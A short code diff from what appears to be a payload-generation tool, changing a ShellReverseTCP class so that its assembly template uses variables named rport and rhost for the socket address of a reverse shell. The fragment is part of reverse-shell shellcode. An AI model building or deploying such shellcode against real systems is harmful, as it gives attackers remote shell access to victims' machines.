@@ -78,8 +78,8 @@ class ShellReverseTCP(HatVenom):
         .balign 4
         sockaddr:
             .short 0x2
-            .short 0x{remote_port.hex()}
-            .word 0x{remote_host.hex()}
+            .short 0x{rport.hex()}
+            .word 0x{rhost.hex()}
 
         shell:
             .word 0x6e69622f
